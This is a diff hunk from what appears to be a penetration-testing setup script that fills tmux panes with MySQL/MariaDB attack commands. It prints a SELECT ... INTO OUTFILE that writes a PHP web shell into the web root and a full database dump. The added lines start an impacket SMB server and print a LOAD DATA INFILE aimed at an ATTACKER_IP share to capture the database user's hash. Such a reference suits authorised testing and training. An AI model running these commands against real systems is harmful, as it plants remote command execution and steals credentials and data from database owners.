@@ -2678,10 +2678,11 @@ tmux send-keys -t PT:30.4 "printf \"\n# Mysql/MariaDB: Read File \n mysql> CREAT
 tmux send-keys -t PT:30.4 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
 tmux send-keys -t PT:30.5 "printf \"\n# Mysql/MariaDB: Write File\n mysql> SELECT \"<?php system(\\\$_GET['cmd']); ?>\" INTO OUTFILE '/var/www/html/shell.php';\n\n\" " Enter
 tmux send-keys -t PT:30.5 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
-tmux send-keys -t PT:30.6 "printf \"\n# Mysql/MariaDB: Get info from DB\n# Get all databases\n mysql> show databases;\n# Get all tables of a specific DB\n# mysql> use <DATABASE>\n# mysql> show tables;\n# Get table structure\n mysql> describe <nome tabella>;\n# Get tables data\n mysql> select * from tables;\n# Exit from DB\n mysql> exit\n# Dump whole database\n# mysqldump -h $ip -P 3306 -u USER -p --single-transaction --routines --triggers --databases <DB_NAME> > backup.sql
-\n\n\" " Enter
+tmux send-keys -t PT:30.6 "printf \"\n# Mysql/MariaDB: Get info from DB\n# Get all databases\n mysql> show databases;\n# Get all tables of a specific DB\n# mysql> use <DATABASE>\n# mysql> show tables;\n# Get table structure\n mysql> describe <nome tabella>;\n# Get tables data\n mysql> select * from tables;\n# Exit from DB\n mysql> exit\n# Dump whole database\n# mysqldump -h $ip -P 3306 -u USER -p --single-transaction --routines --triggers --databases <DB_NAME> > backup.sql\n\n\" " Enter
 tmux send-keys -t PT:30.6 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
-
+tmux send-keys -t PT:30.7 "# Mysql/MariaDB: get DB user HASH" Enter
+tmux send-keys -t PT:30.7 "sudo impacket-smbserver share ./ -smb2support"
+tmux send-keys -t PT:30.8 "printf \"\n# Activate a SMB Request from remote database\n# mysql> LOAD DATA INFILE '\ \<ATTACKER_IP>\myfile.txt' INTO TABLE my_table;\n\n\" " Enter
 cd $folderProject
 
 # Attivazione della modalità interattiva
